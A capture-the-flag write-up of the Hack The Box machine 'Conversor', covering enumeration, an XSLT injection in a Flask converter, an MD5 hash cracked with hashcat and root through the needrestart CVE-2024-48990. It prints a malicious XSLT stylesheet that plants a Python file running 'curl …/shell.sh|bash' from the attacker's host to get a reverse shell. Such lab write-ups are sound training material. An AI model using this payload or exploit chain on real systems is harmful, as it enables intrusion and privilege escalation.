---
title: "Conversor Writeup"
permalink: /season_9/Conversor.html
box:
  machine_name: "Conversor"
  release: "25 Oct 2025"
  retire: "21 Mar 2026"
  os: "Linux"
  base_points: "Easy [20]"
  first_blood_user: "00:09:04 — NLTE (Guru)"
  first_blood_root: "00:21:57 — NLTE (Guru)"
  creator: "FisMatHack (Pro Hacker)"
  machine_url: "https://www.hackthebox.com/machines/conversor"
---

Starting with a nmap scan we see a ssh and http port.
```
┌──(kali㉿kali)-[~/HTB_Labs/season_9/conversor]
└─$ nmap -sV -sC -Pn 10.129.238.31
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-26 16:06 EDT
Nmap scan report for 10.129.238.31
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.47 seconds
```

Going to the http server brings me to a login screen. I test to see if I can register an account and I am successful.
<img width="1409" height="634" alt="image" src="https://github.com/user-attachments/assets/de01ffa5-555a-4dce-a974-b794da3319e6" />
<img width="1410" height="578" alt="image" src="https://github.com/user-attachments/assets/a2166259-45b1-4bc4-a229-ec50edd7e5be" />

Logging in navigates me to a site that allows the user to upload both an XML file and a XSLT file.
<img width="1406" height="801" alt="image" src="https://github.com/user-attachments/assets/2c5ebf43-6af6-49a7-808e-783a83982b07" />

My initial thoughts were checking for XSLT injection. I was able to get a response but no code execution. I knew that there was a vulnerability here but I didn't know how the system sanitized the input, so I moved on to other enumeration methods.

Using feroxbuster, I checked for directories that might be useful. I see that there is an `about` directory I didn't discover before.
```
┌──(kali㉿kali)-[~/HTB_Labs/season_9/conversor]
└─$ feroxbuster -u http://conversor.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --cookies eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6InRlc3R1c2VyIn0.aQDzYQ.fWN9JIf60cUn7Whk3jNa1zL85yk
                                                                                                                                                                                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://conversor.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🤯  Header                │ Cookie: eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6InRlc3R1c2VyIn0.aQDzYQ.fWN9JIf60cUn7Whk3jNa1zL85yk=
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       21l       50w      726c http://conversor.htb/register
200      GET       22l       50w      722c http://conversor.htb/login
302      GET        5l       22w      199c http://conversor.htb/ => http://conversor.htb/login
200      GET      290l      652w     5938c http://conversor.htb/static/style.css
302      GET        5l       22w      199c http://conversor.htb/logout => http://conversor.htb/login
200      GET       81l      214w     2842c http://conversor.htb/about
200      GET      362l     2080w   178136c http://conversor.htb/static/images/fismathack.png
200      GET     8304l    46775w  4058063c http://conversor.htb/static/images/david.png
200      GET     6309l    35740w  3066135c http://conversor.htb/static/images/arturo.png
200      GET    15716l    86534w  7371827c http://conversor.htb/static/source_code.tar.gz
301      GET        9l       28w      319c http://conversor.htb/javascript => http://conversor.htb/javascript/
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        5l       20w      153c http://conversor.htb/convert
301      GET        9l       28w      326c http://conversor.htb/javascript/jquery => http://conversor.htb/javascript/jquery/
200      GET    10879l    44396w   288550c http://conversor.htb/javascript/jquery/jquery
[###################>] - 22m   660963/661661  3s      found:14      errors:731    
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_conversor_htb_-1761671389.state ...
[###################>] - 22m   661011/661661  3s      found:14      errors:731    
[####################] - 17m   220546/220546  219/s   http://conversor.htb/ 
[####################] - 17m   220546/220546  220/s   http://conversor.htb/javascript/ 
[###################>] - 17m   219876/220546  219/s   http://conversor.htb/javascript/jquery/ 
[--------------------] - 0s         0/220546  -       http://conversor.htb/login 
```
Navigating to this directory, I found information about the developers and a button that allows us to download the source code of this application.
<img width="1400" height="915" alt="image" src="https://github.com/user-attachments/assets/003d3f74-8a8c-408b-8928-c18fb1411958" />

Looking through the contents I see that there is a `users.db` file in the instance directory
```
┌──(kali㉿kali)-[~/HTB_Labs/season_9/conversor/source_code]
└─$ tree .                     
.
├── app.py
├── app.wsgi
├── install.md
├── instance
│   └── users.db
├── scripts
├── source_code.tar.gz
├── static
│   ├── images
│   │   ├── arturo.png
│   │   ├── david.png
│   │   └── fismathack.png
│   ├── nmap.xslt
│   └── style.css
├── templates
│   ├── about.html
│   ├── base.html
│   ├── index.html
│   ├── login.html
│   ├── register.html
│   └── result.html
└── uploads
```

However the contents of this database is empty

Looking through other files, I checked the contents of the `app.py` file and the `install.dm` file.
###### Source Code for App
```
from flask import Flask, render_template, request, redirect, url_for, session, send_from_directory
import os, sqlite3, hashlib, uuid

app = Flask(__name__)
app.secret_key = 'Changemeplease'

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = '/var/www/conversor.htb/instance/users.db'
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def init_db():
    os.makedirs(os.path.join(BASE_DIR, 'instance'), exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS files (
        id TEXT PRIMARY KEY,
        user_id INTEGER,
        filename TEXT,
        FOREIGN KEY(user_id) REFERENCES users(id)
    )''')
    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/')
def index():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM files WHERE user_id=?", (session['user_id'],))
    files = cur.fetchall()
    conn.close()
    return render_template('index.html', files=files)

@app.route('/register', methods=['GET','POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        conn = get_db()
        try:
            conn.execute("INSERT INTO users (username,password) VALUES (?,?)", (username,password))
            conn.commit()
            conn.close()
            return redirect(url_for('login'))
        except sqlite3.IntegrityError:
            conn.close()
            return "Username already exists"
    return render_template('register.html')
@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))


@app.route('/about')
def about():
 return render_template('about.html')

@app.route('/login', methods=['GET','POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT * FROM users WHERE username=? AND password=?", (username,password))
        user = cur.fetchone()
        conn.close()
        if user:
            session['user_id'] = user['id']
            session['username'] = username
            return redirect(url_for('index'))
        else:
            return "Invalid credentials"
    return render_template('login.html')


@app.route('/convert', methods=['POST'])
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    from lxml import etree
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    try:
        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
        xml_tree = etree.parse(xml_path, parser)
        xslt_tree = etree.parse(xslt_path)
        transform = etree.XSLT(xslt_tree)
        result_tree = transform(xml_tree)
        result_html = str(result_tree)
        file_id = str(uuid.uuid4())
        filename = f"{file_id}.html"
        html_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(html_path, "w") as f:
            f.write(result_html)
        conn = get_db()
        conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
        conn.commit()
        conn.close()
        return redirect(url_for('index'))
    except Exception as e:
        return f"Error: {e}"

@app.route('/view/<file_id>')
def view_file(file_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM files WHERE id=? AND user_id=?", (file_id, session['user_id']))
    file = cur.fetchone()
    conn.close()
    if file:
        return send_from_directory(UPLOAD_FOLDER, file['filename'])
    return "File not found"
```
###### Content of install.dm
```
To deploy Conversor, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```
The `app.py` source code does prove the XML and XSLT vulnerability attempted previously. The code accepts a XSLT file from the user, parses it, and 
###### Vulnerable Code
```
xslt_file = request.files['xslt_file'] # accepts the XSLT from the user

xslt_tree = etree.parse(xslt_path) # parses the XSLT

transform = etree.XSLT(xslt_tree) # Compiles and runs the 
result_tree = transform(xml_tree)
```
However, the vulnerability occurs during the compile and running of the XSLT file. The application runs the uploaded stylesheet without providing an explicit `XSLTAccessControl` policy. Without appropriate restrictions, a malicious stylesheet may be able to read local files or access network resources, depending on the runtime environment.

###### Contents of install.dm
```
To deploy Conversor, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

The `install.dm` shows a cronjob that runs any python script located in the scripts folder every 60 seconds.

Using a malicious XSLT file, we can create a python file that reaches to a python http server that's hosting a malicious .sh script that connects to a listener and creates a reverse shell.

###### Malicious XSLT file
```
<?xml version="1.0" encoding="UTF-8"?> <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:shell="http://exslt.org/common"
extension-element-prefixes="shell"> 
	<xsl:template match="/">
		<shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
			import os os.system("curl 10.10.14.54:8000/shell.sh|bash") </shell:document> </xsl:template> </xsl:stylesheet>
```
Once we set up a python http server, we host our malicious script and wait for a response. After a couple of seconds I am able to get a reverse shell.
<img width="579" height="78" alt="image" src="https://github.com/user-attachments/assets/8f421407-6d6c-4eac-83a8-506e914f219c" />
<img width="649" height="174" alt="image" src="https://github.com/user-attachments/assets/a686ee3d-d47c-4835-a7ca-00454cb35805" />

We are currently logged in as the web service and not an actual user, so remembering that there was a database, I once again checked the `users.db` file and found that there are actually users within it.
###### Users database
```
www-data@conversor:~/conversor.htb/instance$ cat users.db
cat users.db
�7����0�?tablefilesfilesCREATE TABLE files (
        id TEXT PRIMARY KEY,
        user_id INTEGER,
        filename TEXT,
        FOREIGN KEY(user_id) REFERENCES users(id)
    ))=indexsqlite_autoindex_files_1filesP++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)��tableusersusersCREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
���zV,Mtestuser098f6bcd4621d373cade4e832627b4f6.!Mfismathack5b5c3ac3a1c897c94caad48e6c71fdec
����
��  testusersthack

`�X�\

�R
U_371c58e9-18f2-4a23-863d-5a285de7d459371c58e9-18f2-4a23-863d-5a285de7d459.htmlR        U_c25728a7-af79-41e0-b916-a4e9861d9c0ec25728a7-af79-41e0-b916-a4e9861d9c0e.htmlU_1363be8b-c6c8-4227-92cc-1367b434fb141363be8b-c6c8-4227-92cc-1367b434fb14.htmlRU_c3f1ec9b-1b2c-49d2-96a6-33aff7028391c3f1ec9b-1b2c-49d2-96a6-33aff7028391.htmlRU_f06dc183-e13f-4f4c-8389-7e414d7fe573f06dc183-e13f-4f4c-8389-7e414d7fe573.htmlRU_0facc6c2-7625-4240-9dd0-d1085335224c0facc6c2-7625-4240-9dd0-d1085335224c.htmlRU_00508ffa-82dd-4c42-9867-7dd4a6b1660500508ffa-82dd-4c42-9867-7dd4a6b16605.htmlRU_89af2dd2-48b2-41b5-a2ba-e2c7a20b2a8b89af2dd2-48b2-41b5-a2ba-e2c7a20b2a8b.htmlRU_a10bcb29-b9c0-4b3d-99aa-c4f0e8afd4e2a10bcb29-b9c0-4b3d-99aa-c4f0e8afd4e2.htmlRU_8374be69-0931-4445-8f58-5589d27ec7d78374be69-0931-4445-8f58-5589d27ec7d7.html

g]4�g�����
          (U371c58e9-18f2-4a23-863d-5a285de7d459
(Uc25728a7-af79-41e0-b916-a4e9861d9c0e  (U1363be8b-c6c8-4227-92cc-1367b434fb1(Uc3f1ec9b-1b2c-49d2-96a6-33aff7028391(Uf06dc183-e13f-4f4c-8389-7e414d7fe573(U0facc6c2-7625-4240-9dd0-d1085335224c(U00508ffa-82dd-4c42-9867-7dd4a6b16605(U89af2dd2-48b2-41b5-a2ba-e2c7a20b2a8b(Ua10bcb29-b9c0-4b3d-99aa-c4f0e8afd4e2'U     8374be69-0931-4445-8f58-5589d27ec7d7www-data@conversor:~/conversor.htb/instance$
```

I transferred this file over to kali using base64 and then used sqlite to check the contents of the database. I found two users with what looks like MD5 hashes for passwords, which are considered insecure due to their susceptibility to offline password-cracking attacks.
```
┌──(kali㉿kali)-[~/HTB_Labs/season_9/conversor]
└─$ sqlite3 users.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
files  users
sqlite> SELECT * FROM users;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|testuser|098f6bcd4621d373cade4e832627b4f6
sqlite> 
```

Using hashcat, I was able to get a hit for the `fismathack` user `Keepmesafeandwarm`
```
┌──(kali㉿kali)-[~/HTB_Labs/season_9/conversor]
└─$ hashcat -a 0 -m 0 fismathack.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 9 7950X3D 16-Core Processor, 14991/30046 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm        
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 5b5c3ac3a1c897c94caad48e6c71fdec
Time.Started.....: Tue Oct 28 16:04:30 2025 (2 secs)
Time.Estimated...: Tue Oct 28 16:04:32 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7923.7 kH/s (0.16ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10977280/14344385 (76.53%)
Rejected.........: 0/10977280 (0.00%)
Restore.Point....: 10969088/14344385 (76.47%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: KillerG-18 -> Karamba
Hardware.Mon.#1..: Util: 15%

Started: Tue Oct 28 16:04:29 2025
Stopped: Tue Oct 28 16:04:34 2025
```

Using this user/pass combination I was able to log into ssh and get the user flag
```
┌──(kali㉿kali)-[~/HTB_Labs/season_9/conversor]
└─$ ssh fismathack@conversor.htb                                            
The authenticity of host 'conversor.htb (10.129.248.22)' can't be established.
ED25519 key fingerprint is SHA256:xCQV5IVWuIxtwatNjsFrwT7VS83ttIlDqpHrlnXiHR8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'conversor.htb' (ED25519) to the list of known hosts.
fismathack@conversor.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-160-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Oct 28 08:07:29 PM UTC 2025

  System load:  0.0               Processes:             221
  Usage of /:   66.0% of 5.78GB   Users logged in:       0
  Memory usage: 11%               IPv4 address for eth0: 10.129.248.22
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Tue Oct 28 20:07:30 2025 from 10.10.14.54
fismathack@conversor:~$ cat user.txt
de6ef3c5809fc27c64322beee4da9fe0
```

Checking sudo permissions, we see this user can run needrestart as root
```
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

Looking online, I found this [github repository](https://github.com/ten-ops/CVE-2024-48990_needrestart)

Knowing that I can't directly use the makefile on the box, I recreated the steps manually and started the listener script to detect if any root process starts needrestart.
```
┌──(kali㉿kali)-[~/HTB_Labs/season_9/conversor/CVE-2024-48990_needrestart]
└─$ cat makefile                 
all: lib exploit

lib:
        @mkdir -p build
        @mkdir -p /tmp/attacker/importlib
        @nasm -f elf64 src/main.asm -o build/main.o
        @ld -O3 -shared -z notext -nostdlib build/main.o -o /tmp/attacker/importlib/__init__.so

exploit: src/main.asm
        @chmod +x src/listener.sh
        @bash src/listener.sh

clean:
        @rm -rf build exploit main *.o
```

So running the listener and running the command "sudo needrestart -r a", I was able to obtain root and get the flag.
```
fismathack@conversor:~/CVE-2024-48990_needrestart/src$ bash listener.sh
Root obtained!, clear traces ...
ls
importlib  subprocess.py
cat /root/root.txt
8ea23b78f7f52013e6d4a136d07e854e
```
